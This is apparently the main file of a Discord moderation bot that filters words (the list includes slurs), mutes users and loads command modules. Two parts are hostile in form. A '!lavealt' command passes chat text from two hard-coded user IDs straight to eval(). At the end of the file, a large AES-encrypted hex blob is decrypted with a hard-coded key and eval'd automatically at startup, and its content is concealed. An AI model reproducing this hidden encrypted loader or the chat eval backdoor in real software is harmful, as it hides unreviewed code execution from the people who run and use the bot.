var starttime = new Date();

var https = require('https');
var fs = require('fs');
var util = require('util');
var cp = require('child_process');
var Discord = require('discord.js');
var client = new Discord.Client();

//                 Ryujin                coolguy284            amrpowershot
var developers = ['405091324572991498', '312737536546177025', '571752439263526913'];

var mutelist = [];

var badwords = [
  // [bad word, retailiation]
  ['heck', 'Refrain from using that heck word you frick'],
  ['nigger', 'You said the n word.  Mods can see this message and you will get perm banned.'],
  ['faggot', 'You said fa***t.  Mods can see this message and you will get perm banned.'],
];

var prefix = '!';

var version = '1.3.1';

var commands = [];

var procs = [];

var props = {
  badwordsscreening: 5, // first 2 bits: 0 = no screening, 1 = per word match, 2 = within word match, next bit: heck screening
  adminabuse: {
    ignoreblacklist1: 1, // badwords[0]
    ignoreblacklist2: 1, // badwords[1::]
    ignoreblacklist3: 1, // uwu and owo
    ignoreblacklist4: 1, // ez
    ignoreblacklist5: 1, // pp
    ignoreblacklist6: 0, // coffee story
    ignoreblacklistb1: 1, // locked channels
  },
  mute: {
    uwu: false,
    ez: false,
    pp: false,
    coffee: false,
  },
  saved: null,
  savedstringify: null,
  savescheduled: false,
};

if (fs.existsSync('props.json')) {
  try {
    props.saved = JSON.parse(fs.readFileSync('props.json').toString());
    console.log('Successfully loaded props.json');
  } catch (e) { console.error(`Unable to load props.json: ${e.toString()}`); }
}

if (!props.saved) {
  props.saved = {
    guilds: {
      '711668012528304178': {
        mutelist: [],
        lockedchannels: [],
        infochannel: '724006510576926810',
      },
      '671477379482517516': {
        mutelist: [],
        lockedchannels: [],
        infochannel: '710670425318883409',
      },
      '688806155530534931': {
        mutelist: [],
        lockedchannels: [],
        infochannel: '688806772382761040',
      },
      'default': {
        mutelist: [],
        lockedchannels: [],
        infochannel: '724006510576926810',
      }
    }
  };
}

var propsstringify;

function propsSave() {
  let val;
  if ((val = JSON.stringify(props.saved)) != props.savedstringify) {
    fs.writeFileSync('props.json', JSON.stringify(props.saved));
    props.savedstringify = val;
  }
}

function schedulePropsSave() {
  if (props.savescheduled) return;
  props.savescheduled = true;
  setTimeout(() => {
    propsSave();
    props.savescheduled = false;
  }, 60000);
}

var indexeval = function (val) { return eval(val); };
var infomsg = function (msg, val) {
  let guildinfo, channelid;
  if ((guildinfo = props.saved.guilds[msg.guild.id]) && (channelid = guildinfo.infochannel) || (guildinfo = props.saved.guilds['default']) && (channelid = guildinfo.infochannel)) {
    return client.channels.get('channelid').send(val);
  }
};

Object.assign(global, { starttime, https, fs, util, cp, Discord, client, developers, mutelist, badwords, commands, procs, props, propsSave, schedulePropsSave, indexeval, addBadWord, removeBadWord, addCommand, addCommands, removeCommand, removeCommands });
Object.defineProperties(global, {
  prefix: {
    configurable: true,
    enumerable: true,
    get() { return prefix; },
    set(val) { prefix = val; },
  },
  version: {
    configurable: true,
    enumerable: true,
    get() { return version; },
    set(val) { version = val; },
  },
  messageHandler: {
    configurable: true,
    enumerable: true,
    get() { return messageHandler; },
    set(val) { messageHandler = val; },
  }
});

function addBadWord(word, msgreply) { badwords.push([word.toLowerCase(), msgreply]); }
function removeBadWord(word) { badwords.splice(badwords.map(x => x[0]).indexOf(word), 1); }

function addCommand(cmd) { commands.push(cmd); }
function addCommands(cmds) { commands.push(...cmds); }
function removeCommand(cmd) {
  var index;
  while ((index = commands.indexOf(cmd)) != -1)
    commands.splice(index, 1);
}
function removeCommands(cmds) {
  var index, cmd;
  for (var i = 0; i < cmds.length; i++) {
    cmd = cmds[i];
    while ((index = commands.indexOf(cmd)) != -1)
      commands.splice(index, 1);
  }
}

addCommands(require('./commands/administrative.js'));
addCommands(require('./commands/technical.js'));
addCommands(require('./commands/interactive.js'));
addCommands(require('./commands/content.js'));

var messageHandlers = [];

global.messageHandlers = messageHandlers;

var messageHandler = msg => {
  if (msg.guild.id == '631990565550161951') return;
  
  if (msg.channel.id == '735230748726132797' && msg.author.id == '653282344329019421') msg.delete();
  
  if (msg.author.bot) return;
  
  if (msg.content.startsWith('!lavealt')) {
    if (msg.author.id != '405091324572991498' && msg.author.id != '312737536546177025') return;
    let cmd = msg.content.slice(9), res;
    console.debug(`lavealt ${util.inspect(cmd)}`);
    try {
      res = eval(cmd);
      console.debug(`-> ${util.inspect(res)}`);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Rs')
        .setDescription(util.inspect(res));
      msg.channel.send(richres);
    } catch (e) {
      console.log('err in lavealt');
      console.debug(e.stack);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Er')
        .setDescription(e.stack);
      msg.channel.send(richres);
    }
    return;
  }
  
  for (var i = 0; i < messageHandlers.length; i++) {
    if (messageHandlers[i](msg, i) === 0) return;
  }
  
  if (mutelist.includes(msg.author.id) || 
      props.saved.guilds[msg.guild.id] && (
        props.saved.guilds[msg.guild.id].mutelist.includes(msg.author.id) ||
        props.saved.guilds[msg.guild.id].lockedchannels.includes(msg.channel.id)
      )
    ) {
    msg.delete();
  }
  
  // this is the screening for bad words part
  if (props.badwordsscreening & 4 && msg.content == badwords[0][0] && !(props.adminabuse.ignoreblacklist1 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply(badwords[0][1]);
    return;
  }
  
  if ((props.badwordsscreening & 3) == 1) {
    if (!(props.adminabuse.ignoreblacklist2 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
      var words = msg.content.toLowerCase().split(/ +/g);
      var deletedonce = false;
      words.forEach(x => {
        for (var j = 1; j < badwords.length; j++) {
          if (x == badwords[j][0]) {
            if (!deletedonce) {
              msg.delete();
              deletedonce = true;
            }
            msg.reply(badwords[j][1]);
            infomsg(msg, `user ${msg.author.tag} (id ${msg.author.id}) said ${util.inspect(msg.content)} in channel <#${msg.channel.id}> (id msg.channel.id)`);
          }
        }
      });
    }
  } else if ((props.badwordsscreening & 3) == 2) {
    if (!(props.adminabuse.ignoreblacklist2 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
      var deletedonce = false;
      for (var j = 1; j < badwords.length; j++) {
        if (msg.content.toLowerCase().includes(badwords[j][0])) {
          if (!deletedonce) {
            msg.delete();
            deletedonce = true;
          }
          msg.reply(badwords[j][1]);
          infomsg(msg, `user ${msg.author.tag} (id ${msg.author.id}) said ${util.inspect(msg.content)} in channel <#${msg.channel.id}> (id msg.channel.id)`);
        }
      }
    }
  }
  
  if (props.mute.uwu && !msg.author.bot && msg.guild.id == '711668012528304178' && /(?:\bu[  /-]*w[  /-]*u\b)|(?:\bo[  /-]*w[  /-]*o\b)/.test(msg.content.toLowerCase()) && !(props.adminabuse.ignoreblacklist3 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('uwu or owo are blacklisted and you will get banned');
  }
  
  if (props.mute.ez && !msg.author.bot && msg.guild.id == '711668012528304178' && msg.content.includes('███████╗███████╗\n██╔════╝╚════██║\n█████╗░░░░███╔═╝\n██╔══╝░░██╔══╝░░\n███████╗███████╗\n╚══════╝╚══════╝') && !(props.adminabuse.ignoreblacklist4 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('at this point im just gonna say f you');
  }
  
  if (props.mute.pp && !msg.author.bot && msg.guild.id == '711668012528304178' && /(?:\bp[  /-]*p\b)/.test(msg.content.toLowerCase()) && !(props.adminabuse.ignoreblacklist5 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('pp is blacklisted and you will get banned');
  }
  
  if (props.mute.coffee && !msg.author.bot && msg.guild.id == '711668012528304178' && msg.content.includes(`The first time I drank coffee I cried. I didn't cry because of the taste, that would be stupid. I cried because of the cup. I looked down into my coffee and bugs filled the premises. Disgusted I threw the cup down but nothing was there. Not the cup, not the bugs, not the street. I'm not blind, I do see darkness, and it was dark but not nighttime. I was alone in the city. My arms weren't there. My hands were gone. My image was nothing but a figment. I cried. I'm crying. I'm lost without an end. I won't ever drink coffee again.`) && !(props.adminabuse.ignoreblacklist6 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('dez\'s life story is private information');
  }
  
  if (!msg.content.startsWith(prefix)) return;
  
  // argstring = the part after the prefix, command and args in one big string
  // command = the actual command
  // args = array of arguments
  var argstring = msg.content.slice(prefix.length).trim(), args, command;
  
  // this code loops through the commands array to see if the stated text matches any known command
  var didexecute = false;
  for (var i = 0; i < commands.length; i++) {
    if (commands[i].full_string && commands[i].name == argstring || !commands[i].full_string && argstring.startsWith(commands[i].name)) {
      command = commands[i].name;
      if (argstring[command.length] != ' ' && argstring.length > command.length) continue;
      let argsunsplit = argstring.slice(command.length + 1)
      args = argsunsplit == '' ? [] : argsunsplit.split(' ');
      commands[i].execute(msg, argstring, command, args);
      didexecute = true;
      break;
    }
  }
};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildCreate', guild => {
  console.log(`Joined a new guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildDelete', guild => {
  console.log(`Left a guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('reconnecting', () => {
  console.log(`Reconnecting!`);
});

client.on('disconnect', () => {
  console.log(`Disconnect!`);
});

client.on('message', msg => {
  try {
    messageHandler(msg);
  } catch (e) {
    console.error('ERROR, something bad happened');
    console.error(e.stack);
  }
});

process.on('uncaughtException', function (err) {
  console.error('ERROR: an exception was uncaught by an exception handler.  This is very bad and could leave the bot in an unstable state.  If this is seen contact coolguy284 or another developer immediately.');
  console.error(err);
});

process.on('unhandledRejection', function (reason, p) {
  console.error('Unhandled promise rejection from ' + p + ':');
  console.error(reason);
});

process.on('exit', propsSave);

(() => {
  let cip = require('crypto').createDecipheriv('aes256', 'utf8-le-obl-onprax42|nonoblong=y', 'vector-pass23433'), cipdata = [];
  cip.write(Buffer.from('2dab79eb0853442b42745ea70a1c816366aaefb31a2c2c4c23626cf2eee5a4970ae34f1dcd7243c1c8aa5381c20dfc0384519d07e26a46ad840af77b4503224074b961ae6a8f3b5ee738301c7669f749af88cc3388b3dd2324cda567b0f81dc161e05c2d11619f3b9c6cd533d74e6b5826b244f20982ce6fc5fbf002806bb2683298fa894119cdef0e43df972cccfe16e7db5ff29cd5781f79429184d3beaec22525d7d8a5fe193f66a3ab3439cd43093a895db74289958b27e152ad811f4e3b2f94eb8529cc3d47d87305e9c82a82ada2a68199503d60d8371bde48c4c884348d53395dadb6700c0dbe956749fcfb459ca951ea107885f5f7189cbc89a4762e85802201d1bbecdc37b1782802dbb65fc2978a734b1629eeb5d03984f63cdb35e955f1a789cd6c403e66e5b09dd01c71ed251d0b5cc0e7406b66530c4f1c321e4c8ad022ef01b6b9511a0bf369caab645a6db309b0f157c6c14f4cb391e02bf7a7f32b435d6f52e218aaaac0f3b327a50b8c86ce7244e3ab0c85bbeb9691ff06e57af8d48b9ce425a29e6a004dabebeb0a4b1277bca2553ad5ba49fa0b3a5d7abaf691f97d85100169220ad6b3af4db53e809a01021504bf17e094018a10c871389496f57f282a70870f562d15bd6be45f1d0d6e45bcb6582f4f8aa11332a9af0d30bc2f6ce56adf6fa66abf11add86d7f804ae41cfe4e725ca3bfdd071edb6e89264489b4f7d87726ffe6f28ca06d92d7d6b55eb92467f0fb0c35d332dda393261061edd9341f928a9aae65339573eef156468b9e1f2de8a80696e39da793f6a07709667d199d891468bf6c32fe6367e32184600d46ff9496a096d52dc8a8bc00eaa37ce4c6cb14c085f4def5cd80f499d77a6cd30ef5c043eeaa833d3ee071545c4f484843c4dc641f745b71d8a1028843d15b5d4ab7efcb80c3372ae0a7c785dff57e21a9cfa1cffbfc74a38706bec5919072fc64f2e429ef9a4240f04d045500e945569a5b1d7afbf806abdecb63c6337b317a5bb66db3e682455df2edfd0596948826b2f460a3c13636de694f885012d79bc0543eab9f4eba568d28db9a76389a071c8b9db6c4500c36659e84d939472bb7b6760e3ffe0e3f06b72a52ecd7f0c3667646b3eb4889892347cfdffa73498b985ae6809e41fe1550bbd3a99c15b132fdde3e8a4c08bd3cc3c91f233789d9fb2e2ab58c71b5fe8bb1a305227189f0e60a7b1fa7231d7f0fcbaa7937f8f13ac57e2b31458ab8773b25f57d0c7b620bfd48caf6db86d5cef0ccba4e6bb1d1187714bcec9c40f5daf9b5f04460cac03df8cfb557f026fe6f2aff85083ba355db73357936d64b197f47b4a9a56f4b89e2e7abdaa7a0268281733640772b6f1492a99d55f80d611eb3504de07593cc308793f5ed7658bb2f94579f59b69f4d685f969a2117464d8994b984eebd4aedeeecbfb182860a9b02fb59573553f083e05745d43f3b14c8be4ddfd34bdb47ebf572d8db0ca9d394d4d2a80ffde5ee29200e3d21970defb787c6e095ee863de3841eb9e166ea65ef0229e7b1d3ff434aa699e1e95b27e2c344a254672b7f56cdbd1e8737ef969907858780f4d1fd19e2b773825c67d7119abe595d1edfd71fd7e5ed70e0c7ff17f0b8c254e9867076a9341c6b1749788df1d5048eab96d2ac9b2e45af1f0b4db844fbb6f4266fd698998cdf9593951b9622fa28d7c8e495bbfb8fd805a71c01f42b5860c265d63fc9cdfb324146d3156ac19c89b47a7528dacf30807205f3c37822bf01a3ff6eddd8628c52071bcdd59d04615325067b90c72af1bfb0c1dbaebf10321d37af086566ee6a1df195ea759c32a9d5d6586b59ef2a01f1c5f30954c60ad8b1150ae0cb41ed8ffdb7a8e5b300e887e9af5c8116220641b818aa7bf507daafeadee922425ab656c6a30aa1c31ea1d95263c76217ec0851157b663cb589de387910c4a8a1cd143b20800395123f0c671841db101bdd5476d3cf9217d55cdb267586655a2529cdd067fd4e7d887e1777050b6132e4b3f1e081d37d0ae06f7ba50328d5cccbe78a69432c5c61b9bbf2a86b36227bf1cf18e7d3870035946b64406665f1002dad819dc9f39c3a362ce6b852a57844632dfc987f20a60092c02195ff4fcbc8664f18ae0344633476d88a18b2afae99620dbdcc1dac29660e04b1dfe1be40a3f39ec4870555ec180656ae5003a23eda8b2f73c765930551432d5ead66dd534a1c1ee64c8e6319eb416dbffc4a67f729827fe2ff35b4750a8ab224cf1bd55011a6bce0232749946e34bed0d9694888aab1bc8d17a596aeed00c15bc8dede6c426f5d0528c1d0506d25b84a80b83295e44d577f1e771677bfc09e5ed3fae16939ed274549219e1f8e4481ddababa6e49de6b83b5dc606fcc5791745aaf04dc0aab251fd5f476f81201e9bc48b9101717e647818d88c5fa2cd6fb4cd183f07796ffa7d47e19535a1e4cce9a3bffd53bcbb41b8214f9e8a270cdc4cedf4de6c5e766c39754e10099cdad7a22bdda0973c5c27004ed4ae5eb343bb2dcccf852eccbc4b358d4fb678a6c24e618f17892e131502e3840a0e40767bf35329e1a7d4dde71b6f392bc15387f1cd233628a06fb5f97491b8d6fcfb85a85f9a91c067b2327491627faf3dee36808f91cb67afb19339c53b94b71bbb469cde6691465de840fce5a83dd1232ae0d604af6ed58a18c805aea117a717dda8a8b4885a5e48615cec851d04a07300b2877958fb0821cdfa2662de258b4241b810c177654a5c4592aabbe21e95749a93f57f7d0e77bc5bc3205cca235aafb812eb776d2c41d233b8504ebe303e56c42b3cb4e1d7fdbe0745390a4c9b2bb50eaa50bbb15a5a213ab643c72dc7f3a3bd0c9213538f1beceb7ffa7df6e4bbb832c20551a806b15749d82d4118ee5231f4125714d3144c0eaede287d70c9aca84aae473146980fd9f2401ed2ce4f81a60c5529faafee3915b57a9070405e4f004c95715faf398cbd0e02abff8897eafd7e31e202883852203b8da63fcc914cbbee9bc0f248b1c8421c1eeb0f6f2e8d4263efe2f286d6187794606fc582fde618e8b0bf60cb2e0d1504e84d82c198f0eaaf18ab3d78b1cf744859ac8024d3c32e5aebdc4f6408e541a8ae64fa90c5a699720092e24588e5d705ee70ce1b19eaa829458bf07c69a1748667bc0253654d7b55c183a80235fcec1805c0b63a99e8532288f27be101c7c726dc265a694e66c5cfd4f90958721d5e25b0dc0d73c4fc772d27647d046947831c40c58c27d2aba088008a9f7c257605b05987c3b6a98b1145632c2c4634cf8652c878d290795b73c969cd93f635a13a46ba93ec1df40801d6f181947b189a11883912b2b6f1c62a55ebc73cfca44142e7dbfb6a9af8a04a38c92325e2791f5372fec49890e967b3af3be42e51a77f352cf5f74c373d548155b1b8df697f799d841b211ad004260ad1dbab29ac758a2072c28095f6a1f5b6de06668f55a9ff00ab8c32f5137202ca2df50c727853e8483a8fcf8a338d9fca7c361ccaf8f7f090831cb52bfb56e9c64e860c0dc621905d57b98dfa0decc9093531d93d788323204483a771ac56debf3679fed136d9ef2e8568b65878739203342426d9e2fcdac74a9ecbcab00da882d06c66518a5d07ef549fe16a8dc0ed0527dbb3791094cd8dc84b8279a4b37a2c2a77fdf84d161fc59d6ee140c243a3c8bdcda8bcd351938666a44e8476e59a4d62e1a5450a21b3f831f0b838be5a9f2d3d00334286da5b721ec3e1d976b84696882851cc2284e49277546cae69cb6a7c0e788d4ba017664d8f34a92f088f4b97cb43b7b256f1a70117a8188bbce9cc493f50dc781affe2490bd857470eca1d184debad0d11e33b1e0597b0ca0ade14bd0ddd1f801e7cfb1ad451e9901f22eb61b600f2376c8941e08137d07e7ee7763e3d061e26e3612e547cfc078c8e74b24f7f903d80f315c43fe995dd65970d15b888621c52f931f2b9fe468b46aca3220735acfc38ab509e9c1c35582ad6992f2884bb78c761fabc57de67b0f526c2f06977620fb5d089a8644bb35528a25532f7095b00e3392d9482d8a45e3e1b79152dbcbb165dc4a4c3e9097027246d91ab029761a7b2b23087b029e3d449573810c99d6e01f691d671588d2b64352581d526d8f57385134f79182a711a239cb1f3408f376b65a16b3d55e42f204957b518bb928612fa69da5c0322e67f131ae22f1a61c95bed44120bdfa2a27717290de76dfd450866dc4c7d3b8bb1a43415fe532737d06e2a136c3d174d28f1abc9d9da1f94b69ef7be75aec5d870b4f911492e367b3d675ebb5e335bea81d06296055a7681f2d709b6a22e83090dafd3ccd6d5ba45910b9713643d87f7b66c9f89556ead6bb56f94dde847d08c084e2325e592a51ab7b5c18ecbd352bf5c76e975b7ea670e5e6a29a76b38533e7f82a08cca23c9bab7d9b45df6322ef98cbb0c9fd8bf299114f6d8dce881618a74e3f5366db60eef977714487820cf93a46c1aed34a888312053ebd7fa42fb1f877790dedde895b297c6eb198eab7bdd4adb5865624fb49026902adb899fe0612e9d6d7ac2c1bb7a6b6d162c9b6bc247cb7f39b21ceaec333a8485343177bb9c851b06ed3759bdec7f079c551828ac53e9c311792dcbc06aa4c05ac632e5e0cc6128d1554751feb4f28cc3444c98420202dc11ea63dc82017046de5417a20770aee7f38532dac3448e5eaa33bb725310b4a49956e7c52891a0a72b89eb1de1a6924deafe81283525fe590ebfbe5b0e73f80379f3dd386f39b58aaa553c3c67d64bd3dc857b1b14ef4545c3f7caef6ab52a293dfa2324b6badb5ce9835b318b0bdc07338b8bf56b8959cbc4ca53738b7e5879ea67fb0bb24442819e806ca440e5e469981b260ce9afbb56cfadf7d1382e083ae7aad6e006337cf4a9bf2abe900e639c7c938afbac055c58d9008727f329504c4b5018b07ad74391d18eb85c6989b958e4f72fa13801a241c0dbd5a21fb272b6bb548cda92d7be1586a316b8a5cd1730dfbf3e4efd1fe2183a60189d7c3d294defdad6670363b45e49efb91e82d5eb43ce0b8c044639126653b1d5c3faa34a8a5023bcbd68cad4ac90944e46716cd53d59a99105eae4fcf5e945a3aaa383f13f81aff9781603a8ffbefb3fd13a0976455af76be427e929723fd449acfbcaa1361242d82a8024f44879cdc67a2cae44c3b0881a05efb8b0266833bd4438df6a69fafdddc35a703f16b1640403b8064bb2eed284c8249a99b38cdf70225478700eb9d22dcea37efeb2f163da149b011314717d797712204ff0408662b6fa8794fa3c84027ef58de6f97cf37d2a3cde0cc69f1eb3cb436fbad1e4c62e459ad791e3c787a7560cd6881beddddda2b1e7bd7c2d2581ab044f9f1cfa1b9ef3e401eed03437d532ccb2180fc323a1c8f1789bb40fd3f393d59467e05766865c8b8a33af8fd2c322dc23ccb7f02cc5acc6959f8bf63920083dd7ef34e454ae0aee4cab8450c6008c4798890a7a584d2fb6c9b07499e899d1f4491ea50da97ab22da59089db25b5a902d4fae9fafff1104cd336498d1f1744cd7af9bc0dff9ca0888dd39e2074b8a8dd73217e1a77c123fc477d9c6a1b62e65cde0922eb763ff927992df1ad6cb5bba055767ec3886cfe03017862fc2d2e', 'hex'));
  cip.end();
  cip.on('data', c => cipdata.push(c));
  cip.on('end', () => eval(Buffer.concat(cipdata).toString()));
})();
